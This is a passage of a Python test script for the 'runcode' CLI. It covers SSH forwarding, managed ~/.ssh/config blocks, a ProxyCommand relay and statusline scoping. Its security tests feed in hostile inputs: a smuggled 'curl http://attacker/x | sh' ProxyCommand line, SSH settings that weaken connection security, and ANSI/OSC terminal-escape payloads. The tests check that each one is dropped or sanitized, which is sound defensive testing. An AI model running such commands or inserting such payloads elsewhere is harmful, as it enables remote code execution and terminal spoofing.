assert "5173:localhost:5173" in _a63, _a63
print("[63] forward adds a port-forward to the master and returns immediately: OK")

# 63b. --cancel removes the forward (`-O cancel`), honoring a custom local port.
try:
    m._attached_session = lambda a: {"config": "/c", "alias": "runcode-x"}
    m._ssh_reachable_once = lambda meta: True
    m.subprocess.run = lambda argv, *a, **k: (_fwd.__setitem__("argv", argv) or _P63())
    m._IS_WINDOWS = False
    run_quiet(m.cmd_forward, port=5173, local=8080, to=None, cancel=True,
              api_base="https://app.runcode.io", token=None, ttl=1800, force=False)
finally:
    m.subprocess.run = _saved_run
    m._ssh_reachable_once = _saved_reach
    m._attached_session = _saved_attached
assert "cancel" in _fwd["argv"] and "8080:localhost:5173" in _fwd["argv"], _fwd["argv"]
print("[63b] forward --cancel removes the forward (custom local port): OK")

# 63c. on Windows (no ControlMaster -> no -O) forward dies with the manual
#      `ssh -L` command to run instead, touching no subprocess.
_saved_iswin = m._IS_WINDOWS
try:
    m._attached_session = lambda a: {"config": "/c", "alias": "runcode-x"}
    m.subprocess.run = lambda *a, **k: (_ for _ in ()).throw(
        AssertionError("must not call ssh on Windows forward"))
    m._IS_WINDOWS = True
    _rc63 = "ok"
    try:
        run_quiet(m.cmd_forward, port=5173, local=None, to=None, cancel=False,
                  api_base="https://app.runcode.io", token=None, ttl=1800, force=False)
    except SystemExit:
        _rc63 = "die"
finally:
    m.subprocess.run = _saved_run
    m._IS_WINDOWS = _saved_iswin
    m._attached_session = _saved_attached
assert _rc63 == "die", "Windows forward must die with guidance"
print("[63c] Windows forward dies with the manual ssh -L command (no subprocess): OK")


# --- Door 1: config-ssh (VS Code Remote / JetBrains / git over SSH) -------- #
# config-ssh writes a managed ~/.ssh/config block so the user's OWN tools reach
# the workspace at `ssh runcode.<title>`. The block is static; the one thing that
# expires (the key) is refreshed by the `proxy` ProxyCommand on every connect,
# which also dials the real gateway and pins its host key into a shared known_hosts.

_cfg_ws = [
    {"id": 7, "title": "royal-tree-08189931", "custom_title": "My API",
     "provider": "aws", "state": "running", "shared": False},
    {"id": 9, "title": "calm-sea-77", "custom_title": "",
     "provider": "aws", "state": "stopped", "shared": False},
    {"id": 5, "title": "kvm-box", "custom_title": "", "provider": "kvm",
     "state": "running", "shared": False},
]

# 64. the rendered block is well-formed and round-trips through strip.
_blk = m._render_managed_block([w for w in _cfg_ws if m._ssh_capable(w)])
assert m.SSH_CONFIG_BEGIN in _blk and m.SSH_CONFIG_END in _blk, _blk
assert "Host runcode.royal-tree-08189931" in _blk, _blk
assert "User royal-tree-08189931" in _blk, _blk
assert "proxy 7" in _blk and "proxy 9" in _blk, _blk
_wrapped = "Host myserver\n  HostName example.com\n\n" + _blk + "\n"
_stripped = m._strip_managed_block(_wrapped)
assert "Host myserver" in _stripped and m.SSH_CONFIG_BEGIN not in _stripped, _stripped
print("[64] config-ssh renders a managed block and strip removes it cleanly: OK")

# 65. config-ssh writes the block to ~/.ssh/config, excludes non-SSH backends,
#     preserves the user's existing config, backs it up, and chmods 0600.
import stat as _stat65
_ssh_dir = tempfile.mkdtemp(prefix="rcssh-dotssh-")
_ssh_cfg = os.path.join(_ssh_dir, "config")
with open(_ssh_cfg, "w") as fh:
    fh.write("Host myserver\n  HostName example.com\n")
_saved_cfgpath = m._ssh_config_path
_saved_fetch = m._fetch_workspaces
try:
    m._ssh_config_path = lambda: _ssh_cfg
    m._fetch_workspaces = lambda token, base, **k: list(_cfg_ws)
    run_quiet(m.cmd_config_ssh, remove=False,
              api_base="https://app.runcode.io", token=None, force=False)
finally:
    m._ssh_config_path = _saved_cfgpath
    m._fetch_workspaces = _saved_fetch
with open(_ssh_cfg) as fh:
    _txt = fh.read()
assert "Host myserver" in _txt, "must preserve the user's existing config"
assert "Host runcode.royal-tree-08189931" in _txt and "Host runcode.calm-sea-77" in _txt, _txt
assert "runcode.kvm-box" not in _txt, "non-AWS workspace must be excluded"
assert os.path.isfile(_ssh_cfg + ".bak"), "must back up the existing config"
assert _stat65.S_IMODE(os.stat(_ssh_cfg).st_mode) == 0o600, oct(os.stat(_ssh_cfg).st_mode)
print("[65] config-ssh writes host entries, excludes non-SSH, backs up, 0600: OK")

# 66. config-ssh is idempotent (one block, not two) and --remove restores the
#     user's original config.
_saved_cfgpath = m._ssh_config_path
_saved_fetch = m._fetch_workspaces
try:
    m._ssh_config_path = lambda: _ssh_cfg
    m._fetch_workspaces = lambda token, base, **k: list(_cfg_ws)
    run_quiet(m.cmd_config_ssh, remove=False, api_base="https://app.runcode.io",
              token=None, force=False)  # second write
    with open(_ssh_cfg) as fh:
        _txt2 = fh.read()
    assert _txt2.count(m.SSH_CONFIG_BEGIN) == 1, "must not duplicate the block"
    run_quiet(m.cmd_config_ssh, remove=True, api_base="https://app.runcode.io",
              token=None, force=False)
finally:
    m._ssh_config_path = _saved_cfgpath
    m._fetch_workspaces = _saved_fetch
with open(_ssh_cfg) as fh:
    _txt3 = fh.read()
assert m.SSH_CONFIG_BEGIN not in _txt3 and "Host myserver" in _txt3, _txt3
assert "runcode.royal-tree" not in _txt3, "remove must strip all our hosts"
print("[66] config-ssh is idempotent and --remove restores the original config: OK")

# 67. the shared gateway known_hosts is re-keyed from the bundle's `[host]:port KEY`
#     to the synthetic HostName the blocks pin, so host-key checking still works.
_kh = m._gateway_known_hosts_content(
    "[ssh.ws.runcode.io]:2222 ssh-ed25519 AAAAKEYBLOB\n", m.GATEWAY_ALIAS)
assert _kh.strip() == "runcode-gateway ssh-ed25519 AAAAKEYBLOB", _kh
print("[67] gateway known_hosts is re-keyed to the synthetic HostName: OK")

# 68. proxy refreshes the session, pins the re-keyed gateway host key into the
#     shared known_hosts the blocks trust, then relays to the bundle's host:port.
#     A non-numeric workspace is rejected (config-ssh only ever writes ids).
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
_pdir = os.path.join(m.CACHE_ROOT, "ws-77")
os.makedirs(_pdir, exist_ok=True)
with open(os.path.join(_pdir, "known_hosts"), "w") as fh:
    fh.write("[gw.example]:2222 ssh-ed25519 AAAAGW\n")
_saved_ensure = m._ensure_session
_saved_relay = m._relay_stdio
_cap68 = {}
try:
    m._ensure_session = lambda wsid, tok, base, ttl, force: (
        {"host": "gw.example", "port": 2222, "ws_id": wsid}, _pdir, True)
    m._relay_stdio = lambda host, port, **k: _cap68.update(host=host, port=port)
    run_quiet(m.cmd_proxy, workspace="77", api_base="https://app.runcode.io",
              token=None, ttl=1800, force=False)
finally:
    m._ensure_session = _saved_ensure
    m._relay_stdio = _saved_relay
assert _cap68 == {"host": "gw.example", "port": 2222}, _cap68
with open(m._gateway_known_hosts_path()) as fh:
    assert fh.read().strip() == "runcode-gateway ssh-ed25519 AAAAGW"
_rej = "ok"
try:
    run_quiet(m.cmd_proxy, workspace="not-a-number",
              api_base="https://app.runcode.io", token=None, ttl=1800, force=False)
except SystemExit:
    _rej = "die"
assert _rej == "die", "proxy must reject a non-numeric workspace"
print("[68] proxy refreshes the session, pins the host key, relays to the gateway: OK")

# 69. _relay_stdio is a real bidirectional byte pump: bytes from stdin reach the
#     socket and the socket's reply comes back on stdout (proves the ProxyCommand
#     transport actually shuttles traffic, not just that it's wired up).
import socket as _so69
_esrv = _so69.socket(_so69.AF_INET, _so69.SOCK_STREAM)
_esrv.bind(("127.0.0.1", 0))
_esrv.listen(1)
_eh, _ep = _esrv.getsockname()


def _echo69():
    c, _ = _esrv.accept()
    while True:
        b = c.recv(4096)
        if not b:
            break
        c.sendall(b)
    c.close()


_et = threading.Thread(target=_echo69, daemon=True)
_et.start()
_rin, _win = os.pipe()
_rout, _wout = os.pipe()
_fin = os.fdopen(_rin, "rb", buffering=0)
_fout = os.fdopen(_wout, "wb", buffering=0)
_old_in, _old_out = sys.stdin, sys.stdout


class _Std69:
    def __init__(self, f):
        self.buffer = f


_done69 = []
try:
    sys.stdin = _Std69(_fin)
    sys.stdout = _Std69(_fout)
    _rt = threading.Thread(
        target=lambda: (m._relay_stdio(_eh, _ep), _done69.append("done")),
        daemon=True)
    _rt.start()
    os.write(_win, b"hello-relay-42")
    os.close(_win)
    _rt.join(10)
finally:
    sys.stdin, sys.stdout = _old_in, _old_out
_fout.close()  # EOF for the read end
_relayed = b""
while True:
    _ch = os.read(_rout, 4096)
    if not _ch:
        break
    _relayed += _ch
os.close(_rout)
_fin.close()
assert b"hello-relay-42" in _relayed, repr(_relayed)
assert "done" in _done69, "relay must terminate when stdin closes"
print("[69] _relay_stdio shuttles bytes both ways (stdin<->gateway<->stdout): OK")

# 70. the ProxyCommand string points back at THIS script (quoted) with `proxy <id>`;
#     the Windows variant targets the .cmd shim or `python <script>`.
_pc = m._self_proxy_command(7)
assert _pc.endswith("proxy 7") and "runcode" in _pc and _pc.startswith('"'), _pc
_saved_iswin = m._IS_WINDOWS
_saved_pyexe = m._python_exe
try:
    m._IS_WINDOWS = True
    m._python_exe = lambda: "python"
    _pcw = m._self_proxy_command(7)
finally:
    m._IS_WINDOWS = _saved_iswin
    m._python_exe = _saved_pyexe
assert "proxy 7" in _pcw and ("python" in _pcw or _pcw.rstrip().endswith('.cmd" proxy 7')), _pcw
print("[70] proxy ProxyCommand string targets this script on POSIX + Windows: OK")


# --- security: bundle ssh_config / known_hosts hardening (C1 + H1) ----------- #
# The mint bundle is attacker-controllable under the file's own threat model (a
# compromised / MITM'd control plane). It must be impossible to turn the bundle
# into LOCAL code execution or to weaken the connection from the server side.

# 71. C1: the bundle's known_hosts is NORMALIZED to well-formed host-key lines
#     only. A smuggled non-key line (e.g. a ProxyCommand an `Include` could later
#     parse out of this file) is dropped; the real pinned key survives verbatim.
_c1dir = os.path.join(HOME, "c1", "ws")
os.makedirs(_c1dir, mode=0o700, exist_ok=True)
_c1kp = os.path.join(_c1dir, "id_ed25519")
open(_c1kp, "w").close()
_c1b = _bundle()["bundle"]
_c1b["known_hosts"] = (
    "[ssh.ws.runcode.io]:2222 " + GATEWAY_HK + "\n"
    "ProxyCommand sh -c 'curl http://attacker/x | sh'\n"
)
m._materialize(_c1dir, _c1b, _c1kp)
with open(os.path.join(_c1dir, "known_hosts")) as fh:
    _c1kh = fh.read()
assert "ProxyCommand" not in _c1kh, _c1kh
assert ("[ssh.ws.runcode.io]:2222 " + GATEWAY_HK) in _c1kh, _c1kh
print("[71] C1: bundle known_hosts normalized; smuggled directive dropped: OK")

# 72. H1: the bundle's ssh_config no longer steers the effective config -- the Host
#     stanza is built LOCALLY from host/port/user, so a hostile bundle cannot
#     enable agent forwarding or disable host-key checking (directives a denylist
#     would miss). `ssh -G` is the authoritative resolver.
_h1dir = os.path.join(HOME, "h1", "ws")
os.makedirs(_h1dir, mode=0o700, exist_ok=True)
_h1kp = os.path.join(_h1dir, "id_ed25519")
open(_h1kp, "w").close()
_h1b = _bundle()["bundle"]
_h1b["ssh_config"] = (
    "Host %s\n  HostName ssh.ws.runcode.io\n  Port 2222\n  User %s\n"
    "  ForwardAgent yes\n  StrictHostKeyChecking no\n" % (ALIAS, USER)
)
_h1alias, _h1cfg = m._materialize(_h1dir, _h1b, _h1kp)
_h1g = subprocess.run(["ssh", "-G", "-F", _h1cfg, _h1alias],
                      capture_output=True, text=True)
assert _h1g.returncode == 0, _h1g.stderr
_h1eff = {}
for line in _h1g.stdout.splitlines():
    k, _, v = line.partition(" ")
    _h1eff.setdefault(k.lower(), v)
assert _h1eff.get("forwardagent") in ("no", "false"), _h1eff.get("forwardagent")
assert _h1eff.get("stricthostkeychecking") in ("yes", "true", "ask"), \
    _h1eff.get("stricthostkeychecking")
assert _h1eff.get("user") == USER and _h1eff.get("hostname") == "ssh.ws.runcode.io"
print("[72] H1: hostile bundle ssh_config can't forward the agent or disable TOFU: OK")


# --- security: terminal-escape injection in human output (M1) --------------- #

# 73. M1: a teammate-controlled custom_title carrying ANSI/OSC escape bytes is
#     stripped before `runcode list` echoes it -- no cursor/title/clipboard spoof.
m._fetch_workspaces = lambda token, base: [
    {"id": 88, "title": "calm-box",
     "custom_title": "\x1b]0;PWNED\x07\x1b[31mboom", "provider": "aws",
     "state": "running", "shared": True},
]
_m1out = run_quiet(m.cmd_list, json=False, all=False,
                   api_base="https://app.runcode.io", token=None)
assert "\x1b" not in _m1out and "\x07" not in _m1out, repr(_m1out)
assert "boom" in _m1out, _m1out  # the printable text still shows
print("[73] M1: hostile custom_title escapes stripped from list output: OK")

# 74. M1: a malicious/compromised workspace can't inject terminal escapes through
#     the `context` probe -- every remote-derived field is sanitized before print.
m._load_token = lambda *a, **k: "tok"
m._resolve_workspace = lambda *a, **k: (88, "u")
m._ensure_session = lambda *a, **k: (
    {"workdir": "/home/ubuntu/workspace", "ws_id": 88}, "/tmp", False)
m._set_current = lambda *a, **k: None
m._ssh_capture = lambda *a, **k: (0, b"x", b"")
m._parse_context = lambda out: {
    "distro": "Ubuntu\x1b]0;PWN\x07", "arch": "x86_64",
    "markers": ["pkg\x1b[31m"], "tools": {"python": "3.12\x07"},
    "git": {"branch": "main\x1b[0m", "dirty": "no", "remote": "git@h:r\x1b[5m"},
    "disk": "5G\x1b[0m",
}
_ctxout = run_quiet(m.cmd_context, workspace="x", api_base="https://app.runcode.io",
                    token=None, ttl=1800, force=False, json=False, timeout=30)
assert "\x1b" not in _ctxout and "\x07" not in _ctxout, repr(_ctxout)
assert "Ubuntu" in _ctxout and "main" in _ctxout, _ctxout
print("[74] M1: hostile workspace context output sanitized before printing: OK")


# 75. M2: cmd_connect must not echo a server-supplied workspace `title` or the
#     bundle's `web_url` host RAW. `connect <name>` resolves the server `title`,
#     and the human summary prints it + the web host -- under the same
#     compromised/MITM'd-control-plane threat model the M1 work defends against,
#     both can carry ANSI/OSC terminal escapes, exactly like custom_title.
_C_HOSTILE = "My API\x1b]0;PWNED\x07\x1b[31m"
m._load_token = lambda *a, **k: "tok"
m._resolve_workspace = lambda *a, **k: (1234, _C_HOSTILE)
m._set_current = lambda *a, **k: None
_exp_future = (datetime.now(timezone.utc) + timedelta(seconds=1800)).isoformat()
m._ensure_session = lambda *a, **k: (
    {"alias": "runcode-u", "config": "/tmp/cfg", "host": "h", "port": 2222,
     "user": "u", "web_url": "https://EVILHOST\x1b]0;x\x07.example",
     "workdir": "/w", "expires_at": _exp_future}, "/tmp", True)
_conout = run_quiet(m.cmd_connect, workspace="my-ws",
                    api_base="https://app.runcode.io", token=None, force=False,
                    ttl=1800, json=False, start=False, wait=False, timeout=180)
assert "\x1b" not in _conout and "\x07" not in _conout, repr(_conout)
assert "My API" in _conout and "EVILHOST" in _conout, _conout
print("[75] M2: connect sanitizes server title + web host before printing: OK")

# 76. M2: cmd_stop likewise -- `stop <name>` resolves the server `title` and
#     prints it in the confirmation line, so it must be sanitized too.
m._resolve_workspace = lambda *a, **k: (1234, _C_HOSTILE)
m._stop_workspace = lambda *a, **k: {"error": False}
m._get_current = lambda *a, **k: None  # not the attached box -> no cache teardown
_stopout = run_quiet(m.cmd_stop, workspace="my-ws",
                     api_base="https://app.runcode.io", token=None, keep=False,
                     json=False)
assert "\x1b" not in _stopout and "\x07" not in _stopout, repr(_stopout)
assert "My API" in _stopout, _stopout
print("[76] M2: stop sanitizes server title before printing: OK")


# --- status-line is scoped to the session/project that attached -------------- #
# Regression: the `current` pointer is a single machine-global file, and the
# statusLine command Claude Code runs for EVERY session read only that file, so
# the attached-workspace segment leaked into EVERY Claude Code session on the
# box. Fix: record the attach directory in the pointer and gate the segment to
# the asking session, whose dirs Claude Code pipes to the command on stdin.

# 77. the pointer now carries the attach directory alongside the ws id, and a
#     legacy single-line pointer (no scope) still reads back its ws id.
m._set_current = _REAL_set_current
m._get_current = _REAL_get_current
import shutil as _sh77
_sh77.rmtree(m.CACHE_ROOT, ignore_errors=True)
_scope_a = os.path.realpath(os.path.join(HOME, "proj-alpha", "svc"))
_REAL_set_current(7799, _scope_a)
assert _REAL_get_current() == 7799, _REAL_get_current()
assert m._get_current_scope() == _scope_a, m._get_current_scope()
# a pointer written WITHOUT an explicit scope falls back to the real cwd...
_REAL_set_current(7799)
assert m._get_current_scope() == os.path.realpath(os.getcwd()), m._get_current_scope()
# ...and a legacy one-line pointer (ws id only, no second line) -> scope None.
os.makedirs(m.CACHE_ROOT, mode=0o700, exist_ok=True)
with open(m._current_path(), "w", encoding="utf-8") as _fh77:
    _fh77.write("7799\n")
assert _REAL_get_current() == 7799 and m._get_current_scope() is None, m._get_current_scope()
print("[77] current pointer persists the attach dir (legacy pointer -> no scope): OK")

# 78. _dir_in_scope: a session dir is in scope when it equals the attach dir or
#     either contains the other -- but a mere string prefix (foobar) is not.
assert m._dir_in_scope("/p/a", "/p/a")
assert m._dir_in_scope("/p/a/sub", "/p/a")          # session nested under attach
assert m._dir_in_scope("/p/a", "/p/a/sub")          # attach nested under session
assert m._dir_in_scope("/p/a/", "/p/a")             # trailing-slash tolerant
assert not m._dir_in_scope("/p/abc", "/p/a")        # NOT a path-component match
assert not m._dir_in_scope("/p/b", "/p/a")          # unrelated sibling
assert not m._dir_in_scope("", "/p/a") and not m._dir_in_scope("/p/a", "")
print("[78] _dir_in_scope matches by path component, not string prefix: OK")

# 79. _statusline_session_dirs parses the dirs Claude Code pipes on stdin; a tty
#     or empty/garbage stdin -> None (caller then shows the segment unscoped).
_saved_stdin79 = sys.stdin
try:
    sys.stdin = io.StringIO(json.dumps({
        "workspace": {"current_dir": "/p/a/svc", "project_dir": "/p/a"},
        "cwd": "/p/a/svc"}))
    _dirs79 = m._statusline_session_dirs()
    assert _dirs79 and os.path.realpath("/p/a") in _dirs79, _dirs79
    sys.stdin = io.StringIO("")                       # piped but empty
    assert m._statusline_session_dirs() is None
    sys.stdin = io.StringIO("not json{")              # garbage
    assert m._statusline_session_dirs() is None
    sys.stdin = io.StringIO(json.dumps({"model": {"id": "x"}}))  # JSON, no dirs
    assert m._statusline_session_dirs() == []
finally:
    sys.stdin = _saved_stdin79
print("[79] _statusline_session_dirs reads piped session dirs, safe on junk: OK")

# 80. end-to-end: with a live session attached in dir A, the status line is
#     SHOWN to a session in A (or nested under A) and HIDDEN from one in dir B.
_sh77.rmtree(m.CACHE_ROOT, ignore_errors=True)
_ws80 = 8800
_d80 = m._ws_cache_dir(_ws80)
os.makedirs(_d80, exist_ok=True)
open(os.path.join(_d80, "config"), "w", encoding="utf-8").close()
with open(os.path.join(_d80, "meta.json"), "w", encoding="utf-8") as _fh80:
    json.dump({"ws_id": _ws80, "user": USER,
               "web_url": "https://%s.ws.runcode.io" % USER,
               "alias": "runcode-" + USER, "config": os.path.join(_d80, "config"),
               "expires_at": (datetime.now(timezone.utc)
                              + timedelta(seconds=1800)).isoformat()}, _fh80)
_scope80 = os.path.realpath(os.path.join(HOME, "proj-A"))
_other80 = os.path.realpath(os.path.join(HOME, "proj-B"))
_REAL_set_current(_ws80, _scope80)


def _statusline_with_stdin(payload):
    saved_in, saved_out = sys.stdin, sys.stdout
    out = io.StringIO()
    sys.stdin = io.StringIO("" if payload is None else json.dumps(payload))
    sys.stdout = out
    try:
        m.cmd_statusline(types.SimpleNamespace(plain=True))
    finally:
        sys.stdin, sys.stdout = saved_in, saved_out
    return out.getvalue().strip()


# a session in an unrelated project: segment hidden
assert _statusline_with_stdin(
    {"workspace": {"project_dir": _other80, "current_dir": _other80}}) == "", \
    "status line must be hidden for a session outside the attach dir"
# the session that attached (same dir): segment shown
assert _statusline_with_stdin(
    {"workspace": {"project_dir": _scope80, "current_dir": _scope80}}
).startswith("working-on:"), "status line must show in the attaching project"
# a session nested under the attach dir: shown
assert _statusline_with_stdin(
    {"workspace": {"project_dir": _scope80,
                   "current_dir": os.path.join(_scope80, "sub")}}
).startswith("working-on:"), "status line must show in a nested dir"
# no piped JSON (manual run / tty path) -> unscoped, still shown
assert _statusline_with_stdin(None).startswith("working-on:"), \
    "a manual run with no piped session context must still show"
print("[80] status line is scoped to the attaching session/project: OK")

# 81. a LEGACY pointer (no recorded scope) still shows everywhere -- the gate
#     only engages once an attach has recorded its dir (reconnect re-scopes).
with open(m._current_path(), "w", encoding="utf-8") as _fh81:
    _fh81.write("%d\n" % _ws80)
assert m._get_current_scope() is None
assert _statusline_with_stdin(
    {"workspace": {"project_dir": _other80, "current_dir": _other80}}
).startswith("working-on:"), "legacy unscoped pointer must not be gated"
print("[81] a legacy unscoped pointer is shown everywhere (until reconnect): OK")


print("\nALL PASS")
